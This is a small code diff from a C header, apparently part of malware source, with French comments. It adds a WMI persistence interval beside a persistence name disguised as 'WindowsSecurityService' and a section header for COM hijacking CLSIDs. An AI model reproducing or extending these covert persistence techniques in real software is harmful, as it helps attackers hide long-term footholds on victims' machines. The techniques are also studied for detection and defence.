@@ -19,6 +19,7 @@
 
 /* Nom utilisé pour la persistence */
 #define PERSIST_NAME "WindowsSecurityService"
+#define PERSIST_WMI_INTERVAL 60  /* Intervalle WMI en secondes */
 
 /* CLSIDs vulnérables pour COM Hijacking */
 /* Ces CLSIDs sont souvent chargés par des processus système */
